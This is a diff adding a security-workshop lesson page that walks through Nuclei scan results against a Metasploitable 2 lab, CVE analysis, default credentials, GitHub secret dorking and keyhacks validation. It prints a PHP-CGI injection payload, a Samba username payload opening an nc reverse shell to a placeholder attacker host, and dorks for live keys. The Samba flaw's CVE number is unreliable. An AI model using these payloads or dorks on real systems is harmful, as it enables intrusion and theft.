+<span style="color: #e36209; font-weight: bold;">[ftp-weak-credentials]</span> [tcp] [high] 192.168.1.146:21 [password="default",username="ftp"]<br>
+<span style="color: #e36209; font-weight: bold;">[ftp-weak-credentials]</span> [tcp] [high] 192.168.1.146:21 [password="123456",username="ftp"]<br>
+[nfs-v3-exposed] [tcp] [info] 192.168.1.146:2049<br>
+[openssh-detect] [tcp] [info] 192.168.1.146:22 ["SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1"]<br>
+[smtp-detect] [tcp] [info] 192.168.1.146:25<br>
+<span style="color: #e36209; font-weight: bold;">[ftp-weak-credentials]</span> [tcp] [high] 192.168.1.146:21 [password="guest",username="ftp"]<br>
+[vnc-service-detect] [tcp] [info] 192.168.1.146:5900 ["RFB 003.003"]<br>
+[smtp-commands-enum:ehlo] [tcp] [info] 192.168.1.146:25 ["ETRN","STARTTLS","ENHANCEDSTATUSCODES","8BITMIME","DSN","PIPELINING","SIZE 10240000","VRFY"]<br>
+<span style="color: #e36209; font-weight: bold;">[ftp-weak-credentials]</span> [tcp] [high] 192.168.1.146:21 [password="stingray",username="ftp"]<br>
+[vsftpd-detect:version] [tcp] [info] 192.168.1.146:21 ["2.3.4"]<br>
+[fingerprinthub-web-fingerprints:dvwa] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[tech-detect:php] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[apache-httpd-eol:version] [http] [info] http://192.168.1.146/dvwa/ ["2.2.8"]<br>
+[php-eol:version] [http] [info] http://192.168.1.146/dvwa/ ["5.2.4"]<br>
+[tech-detect:php] [http] [info] http://192.168.1.146/dvwa/<br>
+[robots-txt] [http] [info] http://192.168.1.146/dvwa/robots.txt<br>
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.1.146/dvwa/login.php<br>
+[INF] Scan completed in 3m. 69 matches found.<br>
+[INF] HTTP connections: 13621 total, 1379 new, 12242 reused (89.9%)</span>
+                  </div>
+                </div>
+
+                <!-- Section 5 -->
+                <h2 id="critical-cve-triage">5. In-Depth CVE Analysis: PHP-CGI, Samba &amp; DistCC</h2>
+                <p>
+                  A critical skill taught in BugXploit's workshop is translating raw scanner output into verified, actionable vulnerability assessments. Scanners output flags, but an ethical hacker must understand the underlying technical mechanics and exploitation vector.
+                </p>
+
+                <div class="card mb-3 border-danger">
+                  <div class="card-header bg-danger text-white d-flex justify-content-between align-items-center">
+                    <span class="fw-bold">1. CVE-2012-1823: PHP-CGI Query String Remote Code Execution</span>
+                    <span class="severity-pill sev-high">High</span>
+                  </div>
+                  <div class="card-body">
+                    <p class="mb-2"><strong>Target:</strong> <code>http://192.168.1.146/dvwa/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p>
+                    <p class="mb-2">
+                      <strong>Root Cause:</strong> In PHP configurations running via CGI (or wrapper modes where query strings are passed to the binary without escaping), command-line arguments can be injected via the query string. By passing <code>-d allow_url_include=on</code> and <code>-d auto_prepend_file=php://input</code>, the attacker reconfigures the PHP runtime in memory on a per-request basis.
+                    </p>
+                    <p class="mb-0">
+                      <strong>Exploit Impact:</strong> An attacker can send arbitrary PHP code (e.g., <code>&lt;?php system('id'); ?&gt;</code>) directly in the HTTP POST body. The server treats the input stream as code to be executed before executing <code>index.php</code>, resulting in unauthenticated <strong>Remote Code Execution (RCE)</strong> with the privileges of the web server (<code>www-data</code>).
+                    </p>
+                  </div>
+                </div>
+
+                <div class="card mb-3 border-danger">
+                  <div class="card-header bg-danger text-white d-flex justify-content-between align-items-center">
+                    <span class="fw-bold">2. Samba 3.0.20 &amp; SMBv1 Execution (CVE-2026-4480 / usermap script)</span>
+                    <span class="severity-pill sev-critical">Critical</span>
+                  </div>
+                  <div class="card-body">
+                    <p class="mb-2"><strong>Target:</strong> Port 445 (Samba 3.0.20-Debian, SMB 1.0)</p>
+                    <p class="mb-2">
+                      <strong>Root Cause:</strong> Nuclei identified the exact running version of the Samba file sharing daemon. Samba 3.0.20 through 3.0.25rc3 contain a catastrophic vulnerability in the <code>username map script</code> configuration option. When an external script is configured to process usernames, MS-RPC authentication requests that supply shell metacharacters inside the username field are evaluated directly by a system shell.
+                    </p>
+                    <p class="mb-0">
+                      <strong>Exploit Impact:</strong> By sending a username payload formatted as <code>nohup /bin/sh -c "nc -e /bin/sh attacker_ip port" &amp;</code>, the system shell invokes the command with full <strong>root</strong> privileges. This is one of the most reliable remote root vectors on Metasploitable 2.
+                    </p>
+                  </div>
+                </div>
+
+                <div class="card mb-3 border-warning">
+                  <div class="card-header bg-warning text-dark d-flex justify-content-between align-items-center">
+                    <span class="fw-bold">3. CVE-2004-2687: DistCC Daemon Arbitrary Command Execution</span>
+                    <span class="severity-pill sev-high">High</span>
+                  </div>
+                  <div class="card-body">
+                    <p class="mb-2"><strong>Target:</strong> Port 3632/tcp (distccd)</p>
+                    <p class="mb-2">
+                      <strong>Root Cause:</strong> <code>distcc</code> is a distributed compiler daemon designed to allow software builds across multiple cluster nodes without local compilation overhead. In its legacy implementations, the daemon executed compilation tasks without verifying the authentication or integrity of client instructions.
+                    </p>
+                    <p class="mb-0">
+                      <strong>Exploit Impact:</strong> Attackers can craft a raw TCP packet mimicking a compilation job that directs the server to execute arbitrary shell commands (e.g., spawning reverse shells as the <code>daemon</code> user).
+                    </p>
+                  </div>
+                </div>
+
+                <!-- Section 6 -->
+                <h2 id="default-credentials">6. Default Credentials &amp; Weak Service Auditing (Postgres, VNC, FTP)</h2>
+                <p>
+                  Beyond software vulnerabilities, misconfigured credentials and forgotten administrative accounts represent the easiest access vector for threat actors. Nuclei automatically executed dictionary checks and service handshakes against non-HTTP ports:
+                </p>
+
+                <div class="row g-3 my-2">
+                  <div class="col-md-4">
+                    <div class="card h-100 border-danger">
+                      <div class="card-body">
+                        <span class="severity-pill sev-critical mb-2">Critical</span>
+                        <h5 class="fw-bold">PostgreSQL (5432)</h5>
+                        <p class="small text-muted mb-2">Default Accounts &amp; Blank Passwords</p>
+                        <ul class="small mb-0">
+                          <li><code>postgres : postgres</code></li>
+                          <li><code>postgres : &lt;empty&gt;</code></li>
+                          <li>Access to databases: <code>postgres</code>, <code>template1</code></li>
+                        </ul>
+                        <p class="small mt-2 text-danger">Allows arbitrary SQL execution and shell escape via <code>COPY FROM PROGRAM</code>.</p>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="col-md-4">
+                    <div class="card h-100 border-warning">
+                      <div class="card-body">
+                        <span class="severity-pill sev-high mb-2">High</span>
+                        <h5 class="fw-bold">VNC Remote Desktop (5900)</h5>
+                        <p class="small text-muted mb-2">Trivial Authentication</p>
+                        <ul class="small mb-0">
+                          <li>Password: <code>password</code></li>
+                          <li>Password: <code>password123</code></li>
+                          <li>Protocol: RFB 003.003</li>
+                        </ul>
+                        <p class="small mt-2 text-warning">Allows immediate graphical session hijacking via <code>vncviewer 192.168.1.146</code>.</p>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="col-md-4">
+                    <div class="card h-100 border-warning">
+                      <div class="card-body">
+                        <span class="severity-pill sev-high mb-2">High</span>
+                        <h5 class="fw-bold">VSFTPD Service (21)</h5>
+                        <p class="small text-muted mb-2">Weak Dictionary &amp; Anonymous Access</p>
+                        <ul class="small mb-0">
+                          <li>Anonymous FTP enabled</li>
+                          <li><code>ftp : password</code>, <code>ftp : toor</code></li>
+                          <li><code>ftp : default</code>, <code>ftp : 123456</code></li>
+                        </ul>
+                        <p class="small mt-2 text-warning">Allows unauthorized file uploads and reconnaissance of local directories.</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <!-- Section 7 -->
+                <h2 id="ftp-terminal-verification">7. Terminal Verification: vsftpd 2.3.4 &amp; Anonymous Access</h2>
+                <p>
+                  To prove that automated scanner outputs are accurate and not false positives, we returned to our terminal in Kali Linux and executed a manual TCP connection against port 21 using the native <code>ftp</code> client:
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">kali@kali: ~ (Manual FTP Verification)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">┌──(kali㉿kali)-[~]</span><br>
+                    <span class="prompt-symbol">└─$</span> ftp 192.168.1.146:21<br>
+                    <span class="command-output">Connected to 192.168.1.146.<br>
+                    220 (vsFTPd 2.3.4)<br>
+                    331 Please specify the password.<br>
+                    230 Login successful.<br>
+                    Remote system type is UNIX.<br>
+                    Using binary mode to transfer files.<br>
+                    200 Switching to Binary mode.<br>
+                    local: 21 remote: 21<br>
+                    229 Entering Extended Passive Mode (|||47597|).<br>
+                    550 Failed to open file.<br>
+                    221 Goodbye.</span>
+                  </div>
+                </div>
+
+                <p>
+                  The banner <code>220 (vsFTPd 2.3.4)</code> and <code>230 Login successful</code> verified Nuclei's finding in under five seconds. In Day 2, we learned this exact daemon contains the smiley face backdoor (<code>:)</code>) triggering a root shell on port 6200. Nuclei flagged this daemon with both <code>CVE-2015-1419</code> (Denial of Service) and <code>CVE-2021-30047</code>.
+                </p>
+
+                <!-- Section 8 -->
+                <h2 id="http-security-headers">8. Web Defense Gap: Missing HTTP Security Headers</h2>
+                <p>
+                  Nuclei reported 10 critical security headers missing from DVWA's HTTP responses. While developers often overlook response headers, their absence strips modern browsers of their built-in security defenses:
+                </p>
+
+                <div class="table-responsive my-3">
+                  <table class="table table-bordered table-sm align-middle">
+                    <thead class="table-light">
+                      <tr>
+                        <th>Missing Header</th>
+                        <th>Default Vulnerability Without Header</th>
+                        <th>Defensive Implementation</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><code>X-Frame-Options</code></td>
+                        <td>Application can be framed in an iframe by any malicious third party, enabling <strong>Clickjacking</strong> attacks.</td>
+                        <td><code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>Content-Security-Policy (CSP)</code></td>
+                        <td>The browser executes all inline scripts and loads resources from untrusted domains, dramatically increasing the impact of XSS.</td>
+                        <td><code>Content-Security-Policy: default-src 'self'; script-src 'self';</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>Strict-Transport-Security (HSTS)</code></td>
+                        <td>Connections can be downgraded to plaintext HTTP via SSL Strip or MitM attacks on local Wi-Fi.</td>
+                        <td><code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>X-Content-Type-Options</code></td>
+                        <td>Browsers perform MIME-sniffing, executing uploaded text/plain images containing JavaScript as executable HTML.</td>
+                        <td><code>X-Content-Type-Options: nosniff</code></td>
+                      </tr>
+                      <tr>
+                        <td><code>Referrer-Policy</code></td>
+                        <td>Sensitive session tokens, reset tokens, or private IDs present in query strings are leaked to external referrers.</td>
+                        <td><code>Referrer-Policy: strict-origin-when-cross-origin</code></td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <!-- Section 9 -->
+                <h2 id="github-recon-dorks">9. GitHub Reconnaissance &amp; Sensitive Token Dorking</h2>
+                <p>
+                  While network and web scanners probe perimeter infrastructure, modern security breaches increasingly originate from <strong>source code repositories</strong>. Developers routinely commit secrets, database passwords, private encryption keys, and third-party SaaS tokens to public repositories by accident.
+                </p>
+                <p>
+                  <strong>GitHub Dorking</strong> is the process of using GitHub's specialized search syntax to locate inadvertently committed credentials:
+                </p>
+
+                <div class="callout-box">
+                  <h5 class="fw-bold text-primary mb-2"><i class="bi bi-search"></i> Essential GitHub Reconnaissance Dorks</h5>
+                  <ul class="mb-0 small" style="line-height: 1.8;">
+                    <li><code>org:target "api_key"</code> — Searches all repositories under the organization's account for hardcoded API keys.</li>
+                    <li><code>org:target filename:.env</code> — Locates environment configuration files containing database connection strings, JWT secrets, and tokens.</li>
+                    <li><code>org:target "password" filename:config.json</code> — Locates configuration files containing hardcoded database credentials.</li>
+                    <li><code>org:target extension:pem "BEGIN RSA PRIVATE KEY"</code> — Searches for exposed SSH and SSL private certificates.</li>
+                    <li><code>org:target "AKIA"</code> — Hunts for Amazon Web Services (AWS) 20-character Access Key IDs.</li>
+                    <li><code>org:target "sk_live_"</code> — Finds exposed live secret keys for Stripe payment gateways.</li>
+                  </ul>
+                </div>
+
+                <p>
+                  Finding a secret on GitHub is only the first step. In an ethical penetration test or bug bounty assessment, researchers must prove impact <strong>without modifying or corrupting customer data</strong>. This is where <strong>Keyhacks</strong> becomes essential.
+                </p>
+
+                <!-- Section 10 -->
+                <h2 id="streaak-keyhacks">10. Deep Dive: streaak/keyhacks &amp; API Key Validation</h2>
+                <p>
+                  The open-source repository <a href="https://github.com/streaak/keyhacks" target="_blank" rel="noopener noreferrer" class="fw-bold text-primary">streaak/keyhacks</a> is an industry-standard playbook maintained by security researcher <em>Streaak</em>. It provides verified, non-destructive API calls to validate whether an exposed credential is valid, determine its scope and permissions, and demonstrate exploitability safely.
+                </p>
+
+                <p>
+                  Below are key examples of how ethical hackers test leaked API keys using curl commands documented in Keyhacks:
+                </p>
+
+                <div class="keyhack-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <h5 class="fw-bold mb-0 text-primary"><i class="bi bi-shield-lock"></i> 1. Amazon Web Services (AWS Access Key &amp; Secret)</h5>
+                    <span class="badge bg-danger">Critical Impact</span>
+                  </div>
+                  <p class="small text-muted mb-2">When an AWS key pair (<code>AKIA...</code>) is discovered in a commit, testers execute the non-destructive Security Token Service (STS) call:</p>
+                  <pre><code>aws sts get-caller-identity --access-key-id &lt;AWS_ACCESS_KEY&gt; --secret-access-key &lt;AWS_SECRET_KEY&gt;</code></pre>
+                  <p class="small mb-0"><strong>Impact:</strong> Reveals the AWS Account ID, User ARN, and whether the key possesses full administrative privileges without spinning up or destroying cloud instances.</p>
+                </div>
+
+                <div class="keyhack-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <h5 class="fw-bold mb-0 text-primary"><i class="bi bi-credit-card"></i> 2. Stripe Payment Gateway (sk_live_...)</h5>
+                    <span class="badge bg-danger">Financial Critical</span>
+                  </div>
+                  <p class="small text-muted mb-2">A leaked live secret key gives access to customer transaction records and balance sheets:</p>
+                  <pre><code>curl https://api.stripe.com/v1/charges -u sk_live_xxxxxxxxxxxxxxxxxxxx:</code></pre>
+                  <p class="small mb-0"><strong>Impact:</strong> Retrieves the list of recent transactions and customers, proving full control over the payment gateway.</p>
+                </div>
+
+                <div class="keyhack-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <h5 class="fw-bold mb-0 text-primary"><i class="bi bi-telephone-fill"></i> 3. Twilio Communications (Account SID &amp; Auth Token)</h5>
+                    <span class="badge bg-warning text-dark">High Impact</span>
+                  </div>
+                  <p class="small text-muted mb-2">Verifies SMS and voice call gateway access:</p>
+                  <pre><code>curl -G https://api.twilio.com/2010-04-01/Accounts/ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/Messages.json \
+  -u ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:your_auth_token</code></pre>
+                  <p class="small mb-0"><strong>Impact:</strong> Exposes customer SMS logs, two-factor authentication (2FA) verification codes, and phone call records.</p>
+                </div>
+
+                <div class="keyhack-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <h5 class="fw-bold mb-0 text-primary"><i class="bi bi-geo-alt-fill"></i> 4. Google Maps Platform API Key (AIzaSy...)</h5>
+                    <span class="badge bg-secondary">Financial Denial of Service</span>
+                  </div>
+                  <p class="small text-muted mb-2">Tests whether the key is unrestricted across premium Google Maps endpoints:</p>
+                  <pre><code>curl -i "https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&amp;destination=Universal+Studios+Hollywood&amp;key=AIzaSyxxxxxxxxxxxx"</code></pre>
+                  <p class="small mb-0"><strong>Impact:</strong> Attackers can abuse unrestricted keys to run up thousands of dollars in billing costs via Directions, Geocoding, or Places API endpoints.</p>
+                </div>
+
+                <div class="keyhack-card">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <h5 class="fw-bold mb-0 text-primary"><i class="bi bi-slack"></i> 5. Slack Bot &amp; Webhook Tokens (xoxb- / xoxp-)</h5>
+                    <span class="badge bg-warning text-dark">High Impact</span>
+                  </div>
+                  <p class="small text-muted mb-2">Validates corporate chat channel access:</p>
+                  <pre><code>curl -X POST -H 'Authorization: Bearer xoxb-xxxxxxxxxxxx' https://slack.com/api/auth.test</code></pre>
+                  <p class="small mb-0"><strong>Impact:</strong> Verifies access to internal corporate channels, user directories, and sensitive chat histories.</p>
+                </div>
+
+                <!-- Section 11 -->
+                <h2 id="github-hunting-tools">11. Advanced Secret Hunting: iscan.today, Benji Trapp &amp; TruffleHog</h2>
+                <p>
+                  During the session, the instructors introduced three specialized tools and repositories that streamline GitHub reconnaissance:
+                </p>
+
+                <div class="row g-3 my-2">
+                  <div class="col-md-4">
+                    <div class="card h-100 shadow-sm border-0 bg-light">
+                      <div class="card-body">
+                        <div class="text-primary fs-3 mb-2"><i class="bi bi-globe2"></i></div>
+                        <h5 class="fw-bold">iscan.today</h5>
+                        <p class="small text-muted">
+                          A web-based intelligence and dork aggregator that automates search engine and repository queries. It allows researchers to input a domain or brand name and immediately retrieves matched dorks for finding leaked admin portals, open directories, database dumps, and exposed source code.
+                        </p>
+                        <a href="https://iscan.today/" target="_blank" rel="noopener noreferrer" class="btn btn-outline-primary btn-sm">Visit Tool <i class="bi bi-box-arrow-up-right"></i></a>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="col-md-4">
+                    <div class="card h-100 shadow-sm border-0 bg-light">
+                      <div class="card-body">
+                        <div class="text-primary fs-3 mb-2"><i class="bi bi-journal-code"></i></div>
+                        <h5 class="fw-bold">Benji Trapp Dorks</h5>
+                        <p class="small text-muted">
+                          A curated research repository and cheatsheet compiling specialized GitHub dorking queries. It categorizes search strings by specific tech stacks (AWS, Azure, GCP, Docker, Kubernetes secrets, Jenkins credentials, and private keys) to maximize query hit rates while minimizing junk commits.
+                        </p>
+                        <a href="https://benjitrapp.github.io/memories/2022-09-04-github-dorks/" target="_blank" rel="noopener noreferrer" class="btn btn-outline-primary btn-sm">Read Reference <i class="bi bi-box-arrow-up-right"></i></a>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="col-md-4">
+                    <div class="card h-100 shadow-sm border-0 bg-light">
+                      <div class="card-body">
+                        <div class="text-primary fs-3 mb-2"><i class="bi bi-cpu"></i></div>
+                        <h5 class="fw-bold">TruffleHog</h5>
+                        <p class="small text-muted">
+                          The industry gold standard for git repository secret scanning. Built by Truffle Security, TruffleHog inspects full git commit histories using regular expressions and high-entropy calculations, and actively validates findings against live service APIs to eliminate false positives.
+                        </p>
+                        <a href="https://github.com/trufflesecurity/trufflehog" target="_blank" rel="noopener noreferrer" class="btn btn-outline-primary btn-sm">View GitHub <i class="bi bi-box-arrow-up-right"></i></a>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <h3 class="mt-4">How TruffleHog Works</h3>
+                <p>
+                  Developers often think that deleting a sensitive file in a subsequent commit fixes a leak:
+                </p>
+                <pre><code>git rm .env &amp;&amp; git commit -m "Removed credentials" &amp;&amp; git push</code></pre>
+                <p>
+                  However, git is an immutable version control history. The secret remains permanently readable in past commit snapshots. TruffleHog iterates through every single branch, tag, and commit diff in the repository:
+                </p>
+                <pre><code>trufflehog github --repo https://github.com/organization/target-repository</code></pre>
+                <p>
+                  When TruffleHog discovers a candidate key, it conducts an out-of-band verification against the service provider (e.g., querying the AWS STS endpoint or Slack API) and displays a green <code>[VERIFIED]</code> badge, instantly confirming whether the credential is still active.
+                </p>
+
+                <!-- Section 12 -->
+                <h2 id="defense-remediation">12. Defensive Engineering: Pre-Commit Hooks &amp; Secret Hygiene</h2>
+                <p>
+                  Securing source code and protecting modern infrastructure requires shifting security left into the software development life cycle (SDLC):
+                </p>
+
+                <ol>
+                  <li>
+                    <strong>Pre-Commit Hooks:</strong> Implement tools like <code>git-secrets</code>, <code>Gitleaks</code>, or <code>pre-commit</code> hooks locally on developer machines. If a developer attempts to commit code containing an API key pattern (e.g., <code>AKIA...</code> or <code>sk_live_...</code>), the commit is automatically blocked locally before touching git remotes.
+                  </li>
+                  <li>
+                    <strong>CI/CD Secret Scanners:</strong> Integrate TruffleHog or GitHub Secret Scanning into GitHub Actions. Any pull request containing hardcoded credentials immediately fails automated builds.
+                  </li>
+                  <li>
+                    <strong>Centralized Secret Management:</strong> Never store credentials in flat text or source files. Store runtime configuration in secure vaults such as <strong>HashiCorp Vault</strong>, <strong>AWS Secrets Manager</strong>, or <strong>Azure Key Vault</strong>, injected strictly at runtime via environment variables.
+                  </li>
+                  <li>
+                    <strong>Credential Revocation &amp; Rotation:</strong> Treat any key pushed to a public repository as compromised immediately. Rotate the credential, revoke the compromised key pair, and review cloud audit logs (such as AWS CloudTrail) for unauthorized access attempts.
+                  </li>
+                </ol>
+
+                <!-- Section 13 -->
+                <h2 id="day6-takeaways">13. Day 6 Summary &amp; Key Takeaways</h2>
+                <div class="callout-box security-notice">
+                  <h4 class="text-primary"><i class="bi bi-check2-all"></i> Core Insights from Day 6</h4>
+                  <ul class="mb-0" style="line-height: 1.8;">
+                    <li><strong>Automation Amplifies Human Expertise:</strong> Nuclei discovered 69 actionable security findings across HTTP, TCP, and Javascript protocols in under 3 minutes—a task that would have taken hours of manual probing.</li>
+                    <li><strong>Authenticated Scanning Unlocks the Attack Surface:</strong> Injecting session cookies (<code>PHPSESSID</code>) and security states (<code>security=low</code>) enables scanners to evaluate internal endpoints like command execution and administrative panels.</li>
+                    <li><strong>Perimeter Daemons Harbour Lethal Vulnerabilities:</strong> Legacy versions of Samba (3.0.20), PHP-CGI (CVE-2012-1823), and DistCC (CVE-2004-2687) yield instant, unauthenticated root/system compromise.</li>
+                    <li><strong>Source Code is the New Perimeter:</strong> Finding leaked secrets on GitHub via targeted dorking frequently grants access to internal systems without touching a network firewall.</li>
+                    <li><strong>Verify Non-Destructively:</strong> Using <code>keyhacks</code> and tools like <code>TruffleHog</code> allows ethical researchers to prove vulnerability impact without corrupting data or violating client trust.</li>
+                  </ul>
+                </div>
+
+                <!-- Ethical Use & Legal Warning Notice -->
+                <div
+                  class="p-3 my-4 rounded border border-danger bg-danger bg-opacity-10 d-flex align-items-start gap-3">
+                  <div class="text-danger fs-2" style="line-height: 1;">
+                    <i class="bi bi-exclamation-triangle-fill"></i>
+                  </div>
+                  <div>
+                    <h5 class="fw-bold text-danger mb-1" style="font-size: 16px;">
+                      WARNING: Strictly For Educational &amp; Defensive Purposes Only
+                    </h5>
+                    <p class="mb-0 text-dark small" style="line-height: 1.6;">
+                      All automated vulnerability scans using Nuclei, service audits, and GitHub secret testing methodologies documented in this report were performed strictly within an authorized, isolated local virtual laboratory environment (Metasploitable 2) or against simulated test configurations. Scanning unauthorized targets, harvesting private credentials, or accessing corporate data without explicit written consent is illegal under the Electronic Transactions Act (ETA) of Nepal and international cyber law. TheWH2 and BugXploit promote ethical, responsible offensive security research.
+                    </p>
+                  </div>
+                </div>
+
+              </div><!-- .article-content -->
+
+              <!-- Bottom Navigation -->
+              <div class="lesson-nav-buttons">
+                <a href="../day5/index.html" class="btn btn-outline-secondary">
+                  <i class="bi bi-arrow-left"></i> Previous: Day 5
+                </a>
+                <a href="../index.html" class="btn btn-primary">
+                  <i class="bi bi-grid-fill"></i> Workshop Overview
+                </a>
+              </div>
+
+            </article>
+
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Lesson Detailed Content -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="copyright">
+        &copy; 2026 <strong><span>The WH2</span></strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+        Designed with Security by <a href="../../../index.html">The WH2</a>
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="../../../assets/vendor/aos/aos.js"></script>
+  <script src="../../../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="../../../assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="../../../assets/vendor/swiper/swiper-bundle.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="../../../assets/js/main.js"></script>
+
+  <!-- Automatic Clipboard Copy Button for all code blocks -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const codeBlocks = document.querySelectorAll('.lesson-article pre');
+
+      codeBlocks.forEach(function (pre) {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'code-block-wrapper';
+        pre.parentNode.insertBefore(wrapper, pre);
+        wrapper.appendChild(pre);
+
+        const copyBtn = document.createElement('button');
+        copyBtn.className = 'code-copy-btn';
+        copyBtn.setAttribute('type', 'button');
+        copyBtn.setAttribute('title', 'Copy code to clipboard');
+        copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+
+        copyBtn.addEventListener('click', function () {
+          const codeText = pre.innerText.trim();
+          navigator.clipboard.writeText(codeText).then(function () {
+            copyBtn.classList.add('copied');
+            copyBtn.innerHTML = '<i class="bi bi-check-lg"></i>';
+            setTimeout(function () {
+              copyBtn.classList.remove('copied');
+              copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+            }, 2000);
+          }).catch(function (err) {
+            console.error('Failed to copy: ', err);
+          });
+        });
+
+        wrapper.appendChild(copyBtn);
+      });
+    });
+  </script>
+
+</body>
+
+</html>
